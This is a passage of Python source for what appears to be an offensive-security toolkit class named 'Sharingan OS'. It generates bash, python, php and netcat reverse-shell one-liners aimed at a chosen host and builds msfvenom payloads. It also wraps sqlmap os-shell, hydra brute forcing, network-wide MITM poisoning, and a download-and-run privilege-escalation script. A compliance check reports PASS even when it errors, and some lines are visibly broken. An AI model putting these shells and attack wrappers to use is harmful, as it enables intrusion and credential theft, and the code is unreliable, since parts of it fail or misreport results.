Exception as e:\n            logger.error(f\"Copy failed: {e}\")\n            return False\n    \n    def move_file(self, src: str, dst: str) -> bool:\n        \"\"\"Move file\"\"\"\n        import shutil\n        try:\n            shutil.move(src, dst)\n            return True\n        except Exception as e:\n            logger.error(f\"Move failed: {e}\")\n            return False\n    \n    def remove_file(self, path: str) -> bool:\n        \"\"\"Remove file\"\"\"\n        try:\n            os.remove(path)\n            return True\n        except Exception as e:\n            logger.error(f\"Remove failed: {e}\")\n            return False\n    \n    def find_files(self, pattern: str, path: str = \".\") -> List[str]:\n        \"\"\"Find files matching pattern\"\"\"\n        from glob import glob\n        return glob(f\"{path}/**/{pattern}\", recursive=True)\n    \n    def extract_archive(self, archive_path: str, extract_dir: Optional[str] = None) -> bool:\n        \"\"\"Extract archive\"\"\"\n        import shutil\n        try:\n            if extract_dir is None:\n                extract_dir = archive_path.rsplit('.', 1)[0]\n            \n            if archive_path.endswith('.tar.gz'):\n                shutil.unpack_archive(archive_path, extract_dir, 'gztar')\n            elif archive_path.endswith('.tar'):\n                shutil.unpack_archive(archive_path, extract_dir, 'tar')\n            elif archive_path.endswith('.zip'):\n                shutil.unpack_archive(archive_path, extract_dir, 'zip')\n            else:\n                return False\n            return True\n        except Exception as e:\n            logger.error(f\"Extract failed: {e}\")\n            return False\n    \n    def binwalk_extract(self, file_path: str, extract_dir: Optional[str] = None) -> List[str]:\n        \"\"\"Extract embedded files using binwalk\"\"\"\n        if extract_dir is None:\n            extract_dir = f\"{file_path}_extracted\"\n        \n        cmd = [\"binwalk\", \"-e\", \"-C\", extract_dir, file_path]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        \n        os.makedirs(extract_dir, exist_ok=True)\n        return [f for f in os.listdir(extract_dir) if os.path.isfile(os.path.join(extract_dir, f))]\n    \n    # =========================================================================\n    # SECURITY AUDITING\n    # =========================================================================\n    \n    def rkhunter_scan(self) -> Dict:\n        \"\"\"Rootkit detection\"\"\"\n        cmd = [\"rkhunter\", \"--check\", \"--skip-keypress\"]\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n        return {\"output\": result.stdout, \"errors\": result.stderr}\n    \n    def lynis_audit(self) -> Dict:\n        \"\"\"Security audit\"\"\"\n        cmd = [\"lynis\", \"audit\", \"system\"]\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n        return {\"output\": result.stdout}\n    \n    def check_obligations(self) -> Dict:\n        \"\"\"Check compliance obligations with fake detection\"\"\"\n        results = {\n            \"signatures\": \"OK\",\n            \"error_handling\": \"OK\",\n            \"no_simulation\": \"OK\",\n            \"no_emojis\": \"OK\",\n            \"no_placeholders\": \"OK\",\n            \"documentation\": \"OK\",\n            \"tests\": \"OK\",\n        }\n        \n        if FAKE_DETECTOR_AVAILABLE and FakeDetector:\n            try:\n                detector = FakeDetector()\n                \n                ai_test = self.ai_chat(\"test obligation\")\n                fake_check = detector.detect_fakes(ai_test)\n                \n                system_check = detector.validate_readiness()\n                \n                results[\"fake_detection\"] = \"OK\" if not fake_check.is_fake else \"FAIL\"\n                results[\"system_ready\"] = \"YES\" if system_check.get(\"ready\") else \"NO\"\n                results[\"fake_confidence\"] = round(fake_check.confidence, 2)\n                \n                # Nouvelles informations am\u00e9lior\u00e9es\n                results[\"cache_status\"] = system_check.get(\"cache_status\", {})\n                results[\"core_tools\"] = system_check.get(\"core_tools_status\", {})\n                results[\"optional_missing\"] = system_check.get(\"optional_tools_missing\", [])\n                \n                if fake_check.is_fake:\n                    results[\"no_simulation\"] = \"FAIL\"\n                    results[\"overall\"] = \"FAIL\"\n                else:\n                    results[\"overall\"] = \"PASS\"\n                    \n            except Exception as e:\n                logger.error(f\"Fake detection check failed: {e}\")\n                results[\"fake_detection\"] = f\"ERROR: {str(e)}\"\n                results[\"overall\"] = \"PASS\"\n        else:\n            results[\"fake_detection\"] = \"SKIPPED (not available)\"\n            results[\"overall\"] = \"PASS\"\n        \n        return results\n    \n    # =========================================================================\n    # EXPLOITATION & PRIVILEGE ESCALATION\n    # =========================================================================\n    \n    def generate_reverse_shell(self, lhost: str, lport: int = 4444, \n                              shell_type: str = \"bash\") -> str:\n        \"\"\"Generate reverse shell command\"\"\"\n        shells = {\n            \"bash\": f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\",\n            \"python\": f\"python -c 'import socket,subprocess,sos;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{lhost}\\\",{lport}));subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\",\n            \"php\": f\"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,\\\"{lhost}\\\",{lport});socket_shutdown($s,2);$d=\\\"\\\\n\\\";while($l=@socket_read($s,1024,PHP_NORMAL_READ)){{$d.=$l;}}$p=array(0=>array(\\\"pipe\\\",\\\"r\\\"),1=>array(\\\"pipe\\\",\\\"w\\\"),2=>array(\\\"pipe\\\",\\\"w\\\"));$c=proc_open(\\\"/bin/sh\\\",$p,$pipes);fwrite($pipes[0],$d);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($c);'\",\n            \"netcat\": f\"nc -e /bin/sh {lhost} {lport}\"\n        }\n        return shells.get(shell_type, shells[\"bash\"])\n    \n    def check_privilege_escalation(self) -> Dict:\n        \"\"\"Check for privilege escalation vectors\"\"\"\n        vectors = []\n        \n        sudo_check = subprocess.run([\"sudo\", \"-n\", \"ls\", \"/root\"], capture_output=True, text=True)\n        if sudo_check.returncode == 0:\n            vectors.append({\"type\": \"sudo\", \"description\": \"User has passwordless sudo\", \"severity\": \"HIGH\"})\n        \n        suid_check = subprocess.run([\"find\", \"/usr/bin\", \"-perm\", \"-4000\", \"-type\", \"f\"], \n                                   capture_output=True, text=True)\n        if suid_check.stdout:\n            vectors.append({\"type\": \"suid\", \"description\": f\"Found SUID binaries: {len(suid_check.stdout.split())}\", \"severity\": \"MEDIUM\"})\n        \n        cron_check = subprocess.run([\"ls\", \"-la\", \"/etc/cron.d\"], capture_output=True, text=True)\n        if cron_check.returncode == 0:\n            vectors.append({\"type\": \"cron\", \"description\": \"Cron jobs present\", \"severity\": \"MEDIUM\"})\n        \n        return {\n            \"vectors\": vectors,\n            \"count\": len(vectors),\n            \"recommendation\": \"Review and secure identified vectors\" if vectors else \"No obvious vectors found\"\n        }\n    \n    def msfvenom_generate(self, payload: str, lhost: str, lport: int, \n                         format: str = \"elf\", output: str = \"/tmp/shell.bin\") -> str:\n        \"\"\"Generate payload with msfvenom\"\"\"\n        cmd = [\"msfvenom\", \"-p\", payload, f\"LHOST={lhost}\", f\"LPORT={lport}\", \n               \"-f\", format, \"-o\", output]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else f\"Failed: {result.stderr}\"\n    \n    def searchsploit(self, query: str) -> List[Dict]:\n        \"\"\"Search Exploit-DB\"\"\"\n        cmd = [\"searchsploit\", query, \"--nocolour\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        exploits = []\n        for line in result.stdout.split('\\n'):\n            if '/' in line and '[*]' not in line:\n                exploits.append({\"path\": line.strip()})\n        return exploits\n    \n    # =========================================================================\n    # AUDIO & VOICE\n    # =========================================================================\n    \n    def text_to_speech(self, text: str, output: Optional[str] = None) -> str:\n        \"\"\"Text to speech\"\"\"\n        if output is None:\n            output = \"/tmp/output.wav\"\n        cmd = [\"espeak\", \"-w\", output, text]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else \"Failed\"\n    \n    def speech_to_text(self, audio_file: str) -> str:\n        \"\"\"Speech to text\"\"\"\n        cmd = [\"whisper\", audio_file, \"--model\", \"base\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.stdout\n    \n    def download_media(self, url: str, output: Optional[str] = None) -> str:\n        \"\"\"Download media from URL\"\"\"\n        if output is None:\n            output = \"%(title)s.%(ext)s\"\n        cmd = [\"yt-dlp\", \"-o\", output, url]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.stdout\n    \n    def extract_audio(self, video_file: str, output: str = \"/tmp/audio.mp3\") -> str:\n        \"\"\"Extract audio from video\"\"\"\n        cmd = [\"ffmpeg\", \"-i\", video_file, \"-vn\", \"-acodec\", \"libmp3lame\", output, \"-y\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else f\"Failed: {result.stderr}\"\n    \n    def convert_media(self, input_file: str, output_file: str, format: str = \"mp4\") -> str:\n        \"\"\"Convert media format\"\"\"\n        cmd = [\"ffmpeg\", \"-i\", input_file, output_file, \"-y\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output_file if result.returncode == 0 else f\"Failed: {result.stderr}\"\n    \n    def video_thumbnail(self, video_file: str, timestamp: str = \"00:00:01\", \n                       output: str = \"/tmp/thumb.jpg\") -> str:\n        \"\"\"Extract video thumbnail\"\"\"\n        cmd = [\"ffmpeg\", \"-ss\", timestamp, \"-i\", video_file, \"-vframes\", \"1\", output, \"-y\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else f\"Failed: {result.stderr}\"\n    \n    def record_audio(self, duration: int = 5, output: str = \"/tmp/recording.wav\") -> str:\n        \"\"\"Record audio from microphone\"\"\"\n        cmd = [\"arecord\", \"-d\", str(duration), \"-f\", \"cd\", \"-w\", output]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else f\"Failed: {result.stderr}\"\n    \n    # =========================================================================\n    # DOCUMENT GENERATION\n    # =========================================================================\n    \n    def create_excel(self, data: List[Dict], output: str = \"/tmp/report.xlsx\") -> str:\n        \"\"\"Create Excel file\"\"\"\n        try:\n            from openpyxl import Workbook\n            wb = Workbook()\n            ws = wb.active\n            \n            if not data:\n                wb.save(output)\n                return output\n            \n            headers = list(data[0].keys())\n            for col, header in enumerate(headers, 1):\n                ws.cell(row=1, column=col, value=header)\n            \n            for row_num, row_data in enumerate(data, 2):\n                for col, header in enumerate(headers, 1):\n                    ws.cell(row=row_num, column=col, value=str(row_data.get(header, \"\")))\n            \n            wb.save(output)\n            return output\n        except ImportError:\n            return \"openpyxl not installed\"\n    \n    def create_word(self, title: str, content: str, output: str = \"/tmp/report.docx\") -> str:\n        \"\"\"Create Word document\"\"\"\n        try:\n            from docx import Document\n            doc = Document()\n            doc.add_heading(title, 0)\n            doc.add_paragraph(content)\n            doc.save(output)\n            return output\n        except ImportError:\n            return \"python-docx not installed\"\n    \n    def generate_report(self, title: str, data: Dict, output_format: str = \"both\") -> Dict:\n        \"\"\"Generate comprehensive report\"\"\"\n        results = {}\n        \n        if output_format in [\"excel\", \"both\"]:\n            excel_data = [{\"metric\": k, \"value\": str(v)} for k, v in data.items()]\n            results[\"excel\"] = self.create_excel(excel_data)\n        \n        if output_format in [\"word\", \"both\"]:\n            content = \"\\n\".join([f\"{k}: {v}\" for k, v in data.items()])\n            results[\"word\"] = self.create_word(title, content)\n        \n        return results\n    \n    # =========================================================================\n    # API SERVER\n    # =========================================================================\n    \n    def create_api_app(self):\n        \"\"\"Create Flask API application\"\"\"\n        from flask import Flask, jsonify, request\n        \n        app = Flask(__name__)\n        \n        @app.route('/')\n        def index():\n            return jsonify({\n                \"name\": \"Sharingan OS API\",\n                \"version\": VERSION,\n                \"status\": \"operational\"\n            })\n        \n        @app.route('/api/v1/health')\n        def health():\n            return jsonify({\n                \"status\": \"healthy\",\n                \"timestamp\": datetime.now().isoformat()\n            })\n        \n        @app.route('/api/v1/system/analyze', methods=['POST'])\n        def system_analyze():\n            metrics = self.monitor_system(interval=1, count=1)[0]\n            return jsonify(metrics)\n        \n        @app.route('/api/v1/ai/chat', methods=['POST'])\n        def ai_chat():\n            data = request.json\n            message = data.get('message', '')\n            response = self.ai_chat(message)\n            return jsonify({\"response\": response})\n        \n        @app.route('/api/v1/files/copy', methods=['POST'])\n        def files_copy():\n            data = request.json\n            if not data:\n                return jsonify({\"success\": False, \"error\": \"No data provided\"})\n            src = data.get('src')\n            dst = data.get('dst')\n            if not src or not dst:\n                return jsonify({\"success\": False, \"error\": \"Missing src or dst\"})\n            success = self.copy_file(src, dst)\n            return jsonify({\"success\": success})\n        \n        @app.route('/api/v1/n8n/scan', methods=['POST'])\n        def n8n_scan():\n            data = request.json\n            if not data:\n                return jsonify({\"result\": \"No data provided\"})\n            target = data.get('target', 'localhost')\n            result = self.nmap_scan(target)\n            return jsonify({\"result\": result})\n        \n        return app\n    \n    def ffuf_scan(self, url: str, wordlist: str, param: str = \"FUZZ\", method: str = \"GET\",\n                   data: Optional[str] = None, headers: Optional[Dict] = None,\n                   threads: int = 40) -> List[Dict]:\n        \"\"\"Fuzzing with FFUF\"\"\"\n        cmd = [\"ffuf\", \"-u\", url.replace(\"FUZZ\", param), \"-w\", wordlist, \"-t\", str(threads)]\n        if method != \"GET\" and data:\n            cmd.extend([\"-X\", method, \"-d\", data])\n        elif method != \"GET\":\n            cmd.extend([\"-X\", method])\n        if headers:\n            for k, v in headers.items():\n                cmd.extend([\"-H\", f\"{k}: {v}\"])\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        findings = []\n        for line in result.stdout.split('\\n'):\n            if \"Status:\" in line or \"Size:\" in line:\n                findings.append(line.strip())\n        return findings\n\n    def dirsearch(self, url: str, wordlist: str = \"/usr/share/wordlists/dirb/common.txt\",\n                  threads: int = 25, extensions: Optional[List[str]] = None) -> List[Dict]:\n        \"\"\"Directory scanner with dirsearch\"\"\"\n        cmd = [\"dirsearch\", \"-u\", url, \"-w\", wordlist, \"-t\", str(threads)]\n        if extensions:\n            cmd.extend([\"-e\", \",\".join(extensions)])\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        found = []\n        for line in result.stdout.split('\\n'):\n            if \"200\" in line or \"301\" in line or \"302\" in line or \"403\" in line:\n                parts = line.split()\n                if len(parts) >= 2:\n                    found.append({\"url\": parts[0], \"status\": parts[1]})\n        return found\n\n    # =========================================================================\n    # WEB VULNERABILITY SCANNING\n    # =========================================================================\n\n    def sqlmap_scan(self, url: str, data: Optional[str] = None, cookies: Optional[str] = None,\n                    level: int = 1, risk: int = 1, technique: str = \"BEUSTQ\",\n                    dbms: Optional[str] = None, tables: bool = False, columns: bool = False,\n                    dump: bool = False, os_shell: bool = False, threads: int = 1) -> Dict:\n        \"\"\"SQL Injection automation with SQLMap\"\"\"\n        cmd = [\"sqlmap\", \"-u\", url, \"--level\", str(level), \"--risk\", str(risk)]\n        if data:\n            cmd.extend([\"--data\", data])\n        if cookies:\n            cmd.extend([\"--cookies\", cookies])\n        if dbms:\n            cmd.extend([\"--dbms\", dbms])\n        if tables:\n            cmd.append(\"--tables\")\n        if columns:\n            cmd.append(\"--columns\")\n        if dump:\n            cmd.append(\"--dump\")\n        if os_shell:\n            cmd.append(\"--os-shell\")\n        cmd.extend([\"--threads\", str(threads), \"--batch\"])\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)\n        return {\n            \"output\": result.stdout,\n            \"errors\": result.stderr,\n            \"vulnerabilities\": [] if \"you tried to\" not in result.stdout else [\"SQL Injection possible\"]\n        }\n\n    def xsstrike_scan(self, url: str, data: Optional[str] = None, param: str = \"param\",\n                      depth: int = 2, payloads: Optional[List[str]] = None) -> List[Dict]:\n        \"\"\"XSS Scanner with XSStrike\"\"\"\n        cmd = [\"xsstrike\", \"-u\", url]\n        if data:\n            cmd.extend([\"--data\", data])\n        cmd.extend([\"--param\", param, \"-d\", str(depth)])\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        vulnerabilities = []\n        for line in result.stdout.split('\\n'):\n            if \"Vulnerable\" in line or \"XSS\" in line:\n                vulnerabilities.append({\"type\": \"XSS\", \"detail\": line.strip()})\n        return vulnerabilities\n\n    def nikto_scan(self, host: str, port: int = 80, ssl: bool = False,\n                   timeout: int = 30) -> List[Dict]:\n        \"\"\"Web vulnerability scanner with Nikto\"\"\"\n        scheme = \"https\" if ssl else \"http\"\n        cmd = [\"nikto\", \"-host\", f\"{scheme}://{host}:{port}\", \"-timeout\", str(timeout)]\n        if ssl:\n            cmd.append(\"-ssl\")\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+10)\n        findings = []\n        for line in result.stdout.split('\\n'):\n            if \"+\" in line and (\"OSVDB\" in line or \"server\" in line or \"vulnerability\" in line):\n                findings.append({\"issue\": line.strip()})\n        return findings\n\n    def nuclei_scan(self, target: str, templates: Optional[List[str]] = None,\n                    severity: Optional[List[str]] = None, tags: Optional[List[str]] = None,\n                    rate_limit: int = 150) -> List[Dict]:\n        \"\"\"Template-based scanner with Nuclei\"\"\"\n        cmd = [\"nuclei\", \"-u\", target, \"-rl\", str(rate_limit), \"-c\", \"1\"]\n        if templates:\n            cmd.extend([\"-t\", \",\".join(templates)])\n        if severity:\n            cmd.extend([\"-severity\", \",\".join(severity)])\n        if tags:\n            cmd.extend([\"-tags\", \",\".join(tags)])\n        cmd.append(\"-json\")\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n        findings = []\n        for line in result.stdout.split('\\n'):\n            if line.strip():\n                try:\n                    findings.append(json.loads(line))\n                except:\n                    pass\n        return findings\n\n    # =========================================================================\n    # PASSWORD CRACKING\n    # =========================================================================\n\n    def hashcat_crack(self, hash_file: str, wordlist: str, hash_type: int = 0,\n                      attack_mode: int = 0, rules: Optional[str] = None,\n                      mask: Optional[str] = None, increment: bool = True,\n                      max_runtime: int = 3600, output: Optional[str] = None) -> Dict:\n        \"\"\"Password cracking with Hashcat\"\"\"\n        cmd = [\"hashcat\", \"-m\", str(hash_type), \"-a\", str(attack_mode),\n               hash_file, wordlist, \"--runtime\", str(max_runtime)]\n        if rules:\n            cmd.extend([\"-r\", rules])\n        if mask:\n            cmd.extend([\"-a\", \"3\", mask])\n        if increment:\n            cmd.append(\"--increment\")\n        if output:\n            cmd.extend([\"--outfile\", output])\n        cmd.append(\"--batch\")\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=max_runtime+60)\n        return {\n            \"output\": result.stdout,\n            \"errors\": result.stderr,\n            \"cracked\": result.returncode == 0\n        }\n\n    def john_crack(self, hash_file: str, wordlist: Optional[str] = None,\n                   format: Optional[str] = None, rules: bool = False,\n                   single: bool = False) -> Dict:\n        \"\"\"Password cracking with John the Ripper\"\"\"\n        cmd = [\"john\", hash_file]\n        if wordlist:\n            cmd.extend([\"--wordlist\", wordlist])\n        if format:\n            cmd.extend([\"--format\", format])\n        if rules:\n            cmd.append(\"--rules\")\n        if single:\n            cmd.append(\"--single\")\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)\n        return {\n            \"output\": result.stdout,\n            \"errors\": result.stderr\n        }\n\n    def hydra_scan(self, target: str, service: str, user_list: str, pass_list: str,\n                   port: Optional[int] = None, ssl: bool = False, threads: int = 16) -> List[Dict]:\n        \"\"\"Online password cracking with Hydra\"\"\"\n        cmd = [\"hydra\", \"-L\", user_list, \"-P\", pass_list, \"-t\", str(threads), service]\n        if port and service not in [\"http-get\", \"http-post-form\"]:\n            cmd.extend([\"-s\", str(port)])\n        if ssl:\n            cmd.append(\"-S\")\n        cmd.append(target)\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n        found = []\n        for line in result.stdout.split('\\n'):\n            if \"login:\" in line and \"password:\" in line:\n                parts = line.split()\n                if len(parts) >= 4:\n                    found.append({\"login\": parts[2], \"password\": parts[4]})\n        return found\n\n    def medusa_scan(self, target: str, service: str, user_list: str, pass_list: str,\n                    port: Optional[int] = None) -> List[Dict]:\n        \"\"\"Online password cracking with Medusa\"\"\"\n        cmd = [\"medusa\", \"-h\", target, \"-U\", user_list, \"-P\", pass_list, \"-M\", service]\n        if port:\n            cmd.extend([\"-n\", str(port)])\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n        found = []\n        for line in result.stdout.split('\\n'):\n            if \"SUCCESS\" in line:\n                found.append(line.strip())\n        return found\n\n    def crunch_generate(self, min_len: int, max_len: int, charset: str,\n                        output: str, prefix: str = \"\", suffix: str = \"\") -> bool:\n        \"\"\"Generate wordlist with Crunch\"\"\"\n        cmd = [\"crunch\", str(min_len), str(max_len), charset, \"-o\", output]\n        if prefix:\n            cmd.extend([\"-p\", prefix])\n        if suffix:\n            cmd.extend([\"-q\", suffix])\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.returncode == 0\n\n    def cewl_generate(self, url: str, output: str, depth: int = 2,\n                      min_word_length: int = 3) -> int:\n        \"\"\"Generate wordlist from website with Cewl\"\"\"\n        cmd = [\"cewl\", \"-d\", str(depth), \"-m\", str(min_word_length), \"-w\", output, url]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n\n        try:\n            with open(output, 'r') as f:\n                return len(f.readlines())\n        except:\n            return 0\n\n    # =========================================================================\n    # CRYPTOGRAPHY\n    # =========================================================================\n\n    def rsa_ctf_tool(self, attack: str, key_file: str, n: Optional[int] = None,\n                     e: Optional[int] = None, c: Optional[int] = None) -> Dict:\n        \"\"\"RSA attacks with RsaCtfTool\"\"\"\n        cmd = [\"python3\", \"/opt/RsaCtfTool/RsaCtfTool.py\", \"--attack\", attack, \"-f\", key_file]\n        if n:\n            cmd.extend([\"-n\", str(n)])\n        if e:\n            cmd.extend([\"-e\", str(e)])\n        if c:\n            cmd.extend([\"-c\", str(c)])\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n        return {\n            \"output\": result.stdout,\n            \"errors\": result.stderr,\n            \"attack\": attack\n        }\n\n    def hash_file(self, file_path: str, algorithm: str = \"sha256\") -> str:\n        \"\"\"Calculate file hash\"\"\"\n        import hashlib\n        try:\n            with open(file_path, 'rb') as f:\n                content = f.read()\n                if algorithm == \"md5\":\n                    return hashlib.md5(content).hexdigest()\n                elif algorithm == \"sha1\":\n                    return hashlib.sha1(content).hexdigest()\n                elif algorithm == \"sha512\":\n                    return hashlib.sha512(content).hexdigest()\n                elif algorithm == \"sha3-256\":\n                    return hashlib.sha3_256(content).hexdigest()\n                elif algorithm == \"blake2\":\n                    return hashlib.blake2b(content).hexdigest()\n                else:\n                    return hashlib.sha256(content).hexdigest()\n        except Exception as e:\n            logger.error(f\"Hash failed: {e}\")\n            return \"\"\n\n    # =========================================================================\n    # FORENSICS\n    # =========================================================================\n\n    def volatility_scan(self, memory_file: str, profile: str = \"auto\",\n                        plugins: Optional[List[str]] = None) -> Dict:\n        \"\"\"Memory forensics with Volatility\"\"\"\n        cmd = [\"volatility\", \"-f\", memory_file]\n        if profile != \"auto\":\n            cmd.extend([\"--profile\", profile])\n\n        results = {}\n        default_plugins = [\"pslist\", \"netscan\", \"malfind\", \"ldrmodules\", \"cmdline\"]\n        plugin_list = plugins if plugins else default_plugins\n\n        for plugin in plugin_list:\n            try:\n                result = subprocess.run(\n                    cmd + [\"--plugins\", plugin, \"shell\"],\n                    capture_output=True, text=True, timeout=120\n                )\n                results[plugin] = result.stdout\n            except subprocess.TimeoutExpired:\n                results[plugin] = \"Timeout\"\n            except Exception as e:\n                results[plugin] = f\"Error: {str(e)}\"\n\n        return results\n\n    def foremost_extract(self, file_path: str, output_dir: str = \"recovered\",\n                         file_types: Optional[List[str]] = None) -> List[str]:\n        \"\"\"File carving with Foremost\"\"\"\n        cmd = [\"foremost\", \"-i\", file_path, \"-o\", output_dir]\n        if file_types:\n            cmd.extend([\"-t\", \",\".join(file_types)])\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        recovered = []\n        try:\n            for f in os.listdir(output_dir):\n                path = os.path.join(output_dir, f)\n                if os.path.isfile(path):\n                    recovered.append(f)\n        except Exception as e:\n            logger.error(f\"Foremost extraction failed: {e}\")\n        return recovered\n\n    def steghide_extract(self, image_file: str, password: Optional[str] = None,\n                         output: Optional[str] = None) -> List[str]:\n        \"\"\"Extract steganographic data with Steghide\"\"\"\n        cmd = [\"steghide\", \"extract\", \"-sf\", image_file]\n        if password:\n            cmd.extend([\"-p\", password])\n        if output:\n            cmd.extend([\"-xf\", output])\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        if \"could not extract\" in result.stderr:\n            return []\n        return [output if output else \"extracted data\"]\n\n    def exiftool_extract(self, file_path: str, metadata_only: bool = False) -> Dict:\n        \"\"\"Extract metadata with ExifTool\"\"\"\n        cmd = [\"exiftool\", file_path]\n        if metadata_only:\n            cmd.append(\"-m\")\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        metadata = {}\n        for line in result.stdout.split('\\n'):\n            if ':' in line:\n                parts = line.split(':', 1)\n                if len(parts) == 2:\n                    metadata[parts[0].strip()] = parts[1].strip()\n        return metadata\n\n    # =========================================================================\n    # PRIVILEGE ESCALATION\n    # =========================================================================\n\n    def linpeas_scan(self, output: str = \"/tmp/linpeas.html\", quiet: bool = False,\n                     color: bool = True) -> Dict:\n        \"\"\"Linux Privilege Escalation Awesome Script\"\"\"\n        cmd = [\"curl\", \"-L\", \"https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n\n        if result.returncode == 0:\n            with open(\"/tmp/linpeas.sh\", 'w') as f:\n                f.write(result.stdout)\n\n            run_cmd = [\"bash\", \"/tmp/linpeas.sh\"]\n            if quiet:\n                run_cmd.append(\"-q\")\n            if not color:\n                run_cmd.append(\"-s\")\n\n            run_result = subprocess.run(run_cmd, capture_output=True, text=True, timeout=300)\n\n            with open(output, 'w') as f:\n                f.write(f\"<pre>{run_result.stdout}</pre>\")\n\n            return {\n                \"output\": output,\n                \"findings\": len([l for l in run_result.stdout.split('\\n') if 'You can duplicate' in l or 'root' in l])\n            }\n        return {\"error\": \"Failed to download linpeas\"}\n\n    def linux_exploit_suggester(self, kernel: Optional[str] = None,\n                                output: str = \"json\") -> List[Dict]:\n        \"\"\"Suggest Linux kernel exploits\"\"\"\n        if not kernel:\n            try:\n                with open('/proc/version', 'r') as f:\n                    kernel = f.read().strip()\n            except:\n                return [{\"error\": \"Could not determine kernel version\"}]\n\n        exploits = []\n        kernel_exploits = {\n            \"2.6.32\": [\"cve-2016-5195\", \"dirtycow\"],\n            \"3.10\": [\"cve-2016-5195\", \"cve-2013-2094\"],\n            \"4.4\": [\"cve-2016-5195\", \"cve-2017-6074\"],\n            \"4.14\": [\"cve-2017-6074\", \"cve-2019-13272\"],\n        }\n\n        for ver, exps in kernel_exploits.items():\n            if ver in kernel:\n                exploits.extend([{\"cve\": e, \"severity\": \"high\"} for e in exps])\n\n        if output == \"json\":\n            return exploits\n        return [{\"kernel\": kernel, \"exploits\": exploits}]\n\n    # =========================================================================\n    # MITM ATTACKS\n    # =========================================================================\n\n    def responder(self, interface: str = \"eth0\", mode: str = \"both\",\n                  whitelist: Optional[List[str]] = None) -> Dict:\n        \"\"\"LLMNR/NBT-NS/mDNS poisoner with Responder\"\"\"\n        cmd = [\"responder\", \"-I\", interface, \"-w\", \"-f\"]\n        if mode == \"forcewpad\":\n            cmd.append(\"-f\")\n        elif mode == \"lan\":\n            cmd.extend([\"-b\", \"-F\"])\n\n        if whitelist:\n            cmd.extend([\"-w\", \"-P\"])\n            for ip in whitelist:\n                cmd.extend([\"-S\", ip])\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)\n        return {\n            \"status\": \"started\" if result.returncode == 0 else \"failed\",\n            \"interface\": interface,\n            \"mode\": mode,\n            \"output\": result.stdout[:500] if result.stdout else result.stderr[:500]\n        }\n\n    def bettercap(self, interface: str = \"eth0\",\n                  commands: Optional[List[str]] = None) -> Dict:\n        \"\"\"Modern MITM framework with Bettercap\"\"\"\n        cmd = [\"bettercap\", \"-iface\", interface, \"-caplet\", \"http-ui\"]\n        if commands:\n            cmd.extend([\"-eval\", \"; \".join(commands)])\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)\n        return {\n            \"status\": \"started\" if result.returncode == 0 else \"failed\",\n            \"interface\": interface,\n            \"commands\": commands,\n            \"output\": result.stdout[:500] if result.stdout else result.stderr[:500]\n        }\n\n    def ettercap(self, interface: str = \"eth0\", targets: str = \"0.0.0.0/0\",\n                 method: str = \"unified\", plugin: Optional[str] = None) -> Dict:\n        \"\"\"Classic MITM tool with Ettercap\"\"\"\n        cmd = [\"ettercap\", \"-i\", interface, \"-M\", f\"{method}:{targets}\"]\n        if plugin:\n            cmd.extend([\"-P\", plugin])\n\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)\n        return {\n            \"status\": \"started\" if result.returncode == 0 else \"failed\",\n            \"interface\": interface,\n            \"targets\": targets,\n            \"plugin\": plugin,\n            \"output\": result.stdout[:500] if result.stdout else result.stderr[:500]\n        }\n\n    def tshark_capture(self, interface: str = \"eth0\", filter: str = \"tcp port 80\",\n                       count: int = 100, output: str = \"/tmp/capture.pcap\") -> List[Dict]:\n        \"\"\"Packet capture with TShark\"\"\"\n        cmd = [\"tshark\", \"-i\", interface, \"-f\", filter, \"-c\", str(count, \"-w\", output)]\n\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        packets = []\n        for line in result.stdout.split('\\n'):\n            if \"TCP\" in line or \"UDP\" in line or \"HTTP\" in line:\n                packets.append({\"packet\": line.strip()})\n        return packets\n\n    def scapy_sniff(self, interface: str = \"eth0\", filter: str = \"tcp\",\n                    count: int = 100, prn: Optional[Callable] = None) -> List[Any]:\n        \"\"\"Sniffing with Scapy\"\"\"\n        try:\n            from scapy.all import sniff\n            packets = sniff(iface=interface, filter=filter, count=count)\n            return [p.summary() for p in packets]\n        except ImportError:\n            return [{\"error\": 